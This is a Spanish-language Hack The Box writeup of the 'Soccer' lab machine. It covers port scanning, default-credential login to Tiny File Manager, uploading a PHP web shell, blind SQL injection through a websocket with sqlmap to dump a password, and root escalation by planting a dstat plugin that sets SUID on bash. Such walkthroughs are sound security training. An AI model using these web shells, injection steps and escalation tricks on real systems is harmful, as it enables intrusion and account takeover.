---
title: Soccer Writeup
author: miguel3023
date: 2022-12-19
categories: [Writeup, HTB]
tags: [Linux, CTF, Easy, Default Credentials, suid]
image:
  path: ../../assets/img/commons/Soccer/Soccer.png
  width: 800
  height: 450 
---

En esta máquina veremos cómo podemos subir un archivo en php para ejecutar comandos de manera remota, vemos cómo podemos en base a una SQL Injection y con un websocket podemos ver la base de datos y por último nos aprovechamos del privilegio SUID para escalar privilegios

## Reconocimiento

Primeramente hacemos un escaneo a los puertos con nmap para detectar los puertos abiertos 

```
❯ nmap -p- -sS --min-rate 5000 --open -v -n -Pn 10.129.89.200 -oG Openports
Scanning 10.129.89.200 [65535 ports]
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9091/tcp open  xmltec-xmlmail
```

Vemos el puerto 80 abierto, por lo tanto con whatweb podemos ver información sobre la web que corre por ahí

```
❯ whatweb 10.129.89.200
http://10.129.89.200 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.89.200], RedirectLocation[http://soccer.htb/], Title[301 Moved Permanently], nginx[1.18.0]
ERROR Opening: http://soccer.htb/ - no address for soccer.htb
```

Vemos que nos lanza error ya que nos redirige a un dominio. Lo añadimos al **/etc/hosts**

```
echo "10.129.89.200 soccer.htb" >> /etc/hosts
```
Lanzamos nuevamente el whatweb pero ahora hacia el dominio

```
❯ whatweb http://soccer.htb
http://soccer.htb [200 OK] Bootstrap[4.1.1], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.89.200], JQuery[3.2.1,3.6.0], Script, Title[Soccer - Index], X-UA-Compatible[IE=edge], nginx[1.18.0]
```

Si fuzzeamos por direcotorios, encontramos un **/tiny**

```
❯ dirsearch -u http://soccer.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200
  Target: http://soccer.htb/

[22:07:31] Starting: 
[22:08:03] 301 -  178B  - /tiny  ->  http://soccer.htb/tiny/
```
## Intrusión

Vemos un panel de login. Si buscamos en internet por las credenciales que vienen por default en **Tiny File Manager** vemos "admin:admin@123" y obtenemos acceso a la web

![Web]({{ 'assets/img/commons/Soccer/web.png' | relative_url }}){: .center-image }
_Vista principal de la web_

Vemos que tenemos un direcotrio **tiny**, dentro hay otro que es **uploads** y ya dentro podemos hacer click a la derecha arriba para que nos deje subir un archivo

`Nota:` Si no lo hacemos en este orden, no nos dejará subir ningún archivo

![Php]({{ 'assets/img/commons/Soccer/php.png' | relative_url }}){: .center-image }
_Uploads_

Vemos que con una extensión que tengo en el navegador (wappalyzer) la página emplea **php**, por lo cual trataremos de subir un archivo con script php para ejecutar comandos de manera remota

```php
<?php

  echo "<pre>" . shell_exec($_GET['shell']) . "</pre>";
  
?>
```

Lo que hace el anterior script es que mediante etiquetas preformateadas y usando la función "shell_exec" y haciendo una petición por **GET** definimos un parámetro (en este caso "shell") para ejecutar comandos de manera remota gracias a la función empleada

![RCE]({{ 'assets/img/commons/Soccer/rce.png' | relative_url }}){: .center-image }
_RCE_

Una vez comprobamos que tenemos un RCE entablamos una reverse shell y nos ponemos por escucha con netcat

![Reverse_Shell]({{ 'assets/img/commons/Soccer/reverse_shell.png' | relative_url }}){: .center-image }
_Reverse_shell_

Y obtenemos una shell por el puerto en el cual nos pusimos en escucha

```
❯ nc -nlvp 443
listening on [any] 443 ...

www-data@soccer:~/html/tiny/uploads$  whoami
www-data
```

Vemos que hay un archivo de nginx que muestra un subdominio

```
www-data@soccer:~/html/tiny$ cd /etc/nginx/sites-available/
www-data@soccer:/etc/nginx/sites-available$ ls
default  soc-player.htb
www-data@soccer:/etc/nginx/sites-available$ cat soc-player.htb 
server {
	listen 80;
	listen [::]:80;

	server_name soc-player.soccer.htb;

	root /root/app/views;

	location / {
		proxy_pass http://localhost:3000;
		proxy_http_version 1.1;
		proxy_set_header Upgrade $http_upgrade;
		proxy_set_header Connection 'upgrade';
		proxy_set_header Host $host;
		proxy_cache_bypass $http_upgrade;
	}

}
www-data@soccer:/etc/nginx/sites-available$
```

Lo añadimos al **/etc/hosts**. Aunque nos lleva a una web que no tiene mucho para ver.

Si vemos el otro archivo que había en la misma ruta en la que estábamos de antes veremos que se emplea un **websocket**

```
www-data@soccer:/etc/nginx/sites-available$ cat default 
server {
	listen 80;
	listen [::]:80;
	server_name 0.0.0.0;
	return 301 http://soccer.htb$request_uri;
}

server {
	listen 80;
	listen [::]:80;

	server_name soccer.htb;

	root /var/www/html;
	index index.html tinyfilemanager.php;
		
	location / {
               try_files $uri $uri/ =404;
	}

	location ~ \.php$ {
		include snippets/fastcgi-php.conf;
		fastcgi_pass unix:/run/php/php7.4-fpm.sock;
	}

	location ~ /\.ht {
		deny all;
	}

}

```

También podemos ver los puertos internos abiertos

```
www-data@soccer:/etc/nginx/sites-available$ ss -pnltu

Netid   State    Recv-Q   Send-Q     Local Address:Port                   
udp     UNCONN   0        0          127.0.0.53%lo:53                     
udp     UNCONN   0        0                0.0.0.0:68                     
tcp     LISTEN   0        4096       127.0.0.53%lo:53                     
tcp     LISTEN   0        128              0.0.0.0:22                     
tcp     LISTEN   0        511            127.0.0.1:3000                   
tcp     LISTEN   0        511              0.0.0.0:9091                   
tcp     LISTEN   0        70             127.0.0.1:33060                  
tcp     LISTEN   0        151            127.0.0.1:3306                   
tcp     LISTEN   0        511              0.0.0.0:80                     
tcp     LISTEN   0        128                 [::]:22                     
tcp     LISTEN   0        511                 [::]:80
```

Como habíamos visto de antes que tenemos el puerto **9091** abierto, comprobamos si ese puerto es el que tiene corriendo el WebSocket con **websocat**

```
❯ websocat ws://soc-player.soccer.htb:9091 -v
[INFO  websocat::lints] Auto-inserting the line mode
[INFO  websocat::stdio_threaded_peer] get_stdio_peer (threaded)
[INFO  websocat::ws_client_peer] get_ws_client_peer
[INFO  websocat::ws_client_peer] Connected to ws
```
Podemos ver el servicio de **mysql** corriendo

```
www-data@soccer:/etc/nginx$ systemctl status mysql
● mysql.service - MySQL Community Server
     Loaded: loaded (/lib/systemd/system/mysql.service; enabled; vendor preset:>
     Active: active (running) since Mon 2022-12-19 19:15:43 UTC; 6h ago
    Process: 970 ExecStartPre=/usr/share/mysql/mysql-systemd-start pre (code=ex>
   Main PID: 1035
     Status: "Server is operational"
      Tasks: 40 (limit: 4640)
     Memory: 440.9M
     CGroup: /system.slice/mysql.service
             └─1035 /usr/sbin/mysqld
```

## Privesc

Buscando vulnerabilidades al respecto de un Websocket y sql injection encontramos un [artículo](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html). Nos copiamos el script que hay de python y cambiamos la siguientes líneas

`Nota:` Son las líneas 6 y 15

```python
ws_server = "ws://soc-player.soccer.htb:9091"
data = '{"id":"%s"}' % message
```
Este script lo que hace es abrir el puerto **8081** en nuestro equipo y redirigirlo al websocket de la máquina vícitima hacia el puerto 9091. Mientras dejamos corriendo el script, ejecutamos **sqlmap**

```
❯ python3 sqli_blind.py
[+] Starting MiddleWare Server
[+] Send payloads in http://localhost:8081/?id=*
```

```
❯ sqlmap -u "http://localhost:8081/?id=1" --batch -dbs
[INFO] resumed: mysql
[INFO] resumed: information_schema
[INFO] resumed: performance_schema
[INFO] resumed: sys
[INFO] resumed: soccer_db
```

Vemos una base de datos **soccer_db**. Vamos a enumerar las tablas que tiene

```
[INFO] retrieved: accounts
Database: soccer_db
[1 table]
+----------+
| accounts |
+----------+
```
Vemos la tabla **accounts** y enumeraremos sus columnas

```
❯ sqlmap -u "http://localhost:8081/?id=1" --batch -D soccer_db -T accounts --columns
Database: soccer_db
Table: accounts
[4 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| email    | varchar(40) |
| id       | int         |
| password | varchar(40) |
| username | varchar(40) |
+----------+-------------+
```

Vemos **password** y **username** y miramos qué contiene

```
❯ sqlmap -u "http://localhost:8081/?id=1" --batch -D soccer_db -T accounts -C username,password -dump
Database: soccer_db
Table: accounts
[1 entry]
+----------+----------------------+
| username | password             |
+----------+----------------------+
| player   | PlayerOftheMatch2022 |
+----------+----------------------+
```
Como vimos el puerto ssh abierto anteriormente, nos conectamos por ssh con las credenciales de **player**

```
❯ sshpass -p 'PlayerOftheMatch2022' ssh player@10.129.90.242
player@soccer:~$ whoami
player
player@soccer:~$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.90.242
```
Si enumeramos por archivos con el permiso SUID vemos uno interesante

```
player@soccer:~$ find / -perm -4000 2>/dev/null
/usr/local/bin/doas
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/bin/umount
/usr/bin/fusermount
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/at
```

El primero nos interesa, por lo tanto buscamos más archivos con el mismo nombre

```
player@soccer:~$ find / -name **doas** 2>/dev/null
/usr/local/share/man/man5/doas.conf.5
/usr/local/share/man/man1/doas.1
/usr/local/share/man/man8/vidoas.8
/usr/local/share/man/man8/doasedit.8
/usr/local/bin/doasedit
/usr/local/bin/doas
/usr/local/bin/vidoas
/usr/local/etc/doas.conf
```
Echamos un vistaso a **doas.conf**

```
player@soccer:~$ cat /usr/local/etc/doas.conf
permit nopass player as root cmd /usr/bin/dstat
```
Podemos ejecutar **dstat** sin el permiso de root. Ahora buscamos por más archivos o directorios que tengan **dstat** de nombre

```
player@soccer:~$ find / -name *dstat* 2>/dev/null | head
/usr/share/doc/dstat
/usr/share/python3/runtime.d/dstat.rtupdate
/usr/share/dstat
/usr/local/share/dstat
```

Vemos un **/usr/share/dstat** que almacena los archivos de python, los cuales son plugins, pero sobre ese no tenemos permisos de escritura. Buscamos ahora por un archivo **dstat** que tenga como grupo **player**

```
player@soccer:~$ find / -group player 2>/dev/null | grep "dstat"
/usr/local/share/dstat
/proc/4931/task/4931/schedstat
/proc/4931/schedstat
/proc/5042/task/5042/schedstat
/proc/5042/schedstat
/proc/5066/task/5066/schedstat
/proc/5066/schedstat
/proc/5067/task/5067/schedstat
/proc/5067/schedstat
/proc/5356/task/5356/schedstat
/proc/5356/schedstat
/proc/5357/task/5357/schedstat
/proc/5357/schedstat
```
El primero llama la atención ya que, acá también podemos almacenar plugins del comando. Así que crearemos un script en python que nos otorgue SUID a la bash

`Nota:` Tenemos que llamar al script utilizando la misma manera en que se almacenan los otros plugins en la otra ruta, es decir: dstat_nombrescript.py

```python
#!/usr/bin/python3

import os

os.system("chmod u+s /bin/bash")
```
Una vez creado, verificamos si el comando lo almacena

```
player@soccer:/usr/local/share/dstat$ dstat --list
internal:
	aio,cpu,cpu-adv,cpu-use,cpu24,disk,disk24,disk24-old,epoch,fs,int,int24,io,ipc,load,lock,mem,mem-adv,net,page,
	page24,proc,raw,socket,swap,swap-old,sys,tcp,time,udp,unix,vm,vm-adv,zones
/usr/share/dstat:
	battery,battery-remain,condor-queue,cpufreq,dbus,disk-avgqu,disk-avgrq,disk-svctm,disk-tps,disk-util,disk-wait,dstat,
	dstat-cpu,dstat-ctxt,dstat-mem,fan,freespace,fuse,gpfs,gpfs-ops,helloworld,ib,innodb-buffer,innodb-io,innodb-ops,
	jvm-full,jvm-vm,lustre,md-status,memcache-hits,mongodb-conn,mongodb-mem,mongodb-opcount,mongodb-queue,mongodb-stats,
	mysql-io,mysql-keys,mysql5-cmds,mysql5-conn,mysql5-innodb,mysql5-innodb-basic,mysql5-innodb-extra,mysql5-io,mysql5-keys,
	net-packets,nfs3,nfs3-ops,nfsd3,nfsd3-ops,nfsd4-ops,nfsstat4,ntp,postfix,power,proc-count,qmail,redis,rpc,rpcd,
	sendmail,snmp-cpu,snmp-load,snmp-mem,snmp-net,snmp-net-err,snmp-sys,snooze,squid,test,thermal,top-bio,top-bio-adv,
	top-childwait,top-cpu,top-cpu-adv,top-cputime,top-cputime-avg,top-int,top-io,top-io-adv,top-latency,top-latency-avg,
	top-mem,top-oom,utmp,vm-cpu,vm-mem,vm-mem-adv,vmk-hba,vmk-int,vmk-nic,vz-cpu,vz-io,vz-ubc,wifi,zfs-arc,zfs-l2arc,
	zfs-zil
/usr/local/share/dstat:
	script
```
Vemos que sí, así que sólo procedemos a ejecturalo de la siguiente forma

```
player@soccer:/usr/local/share/dstat$ /usr/local/bin/doas -u root /usr/bin/dstat --script
player@soccer:/usr/local/share/dstat$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```
Y ya podemos hacer **bash -p**

```
player@soccer:/usr/local/share/dstat$ bash -p
bash-5.0# cat /root/root.txt 
c1eea9302f59408e750ad663505e8f4b
bash-5.0#
```
